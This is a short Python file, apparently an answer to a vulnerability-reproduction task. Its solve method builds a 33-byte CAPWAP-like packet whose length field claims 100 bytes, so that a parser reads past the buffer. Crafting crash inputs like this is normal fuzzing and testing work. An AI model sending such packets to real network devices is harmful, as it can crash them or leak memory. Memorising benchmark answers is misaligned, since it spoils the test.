class Solution:
    def solve(self, src_path: str) -> bytes:
        # Craft a minimal CAPWAP-like packet with oversized length field to trigger overread
        # Version 1 (0x1), Type 3 (setup), minimal header, length set to 100 (0x64000000 big-endian assumed)
        header = b'\x13\x04\x00\x00\x00\x00\x00\x00'  # Example header: 8 bytes
        length_field = b'\x64\x00\x00\x00'  # 100 bytes claimed
        payload = b'\x00' * (33 - 8 - 4)  # Padding to 33 bytes total
        return header + length_field + payload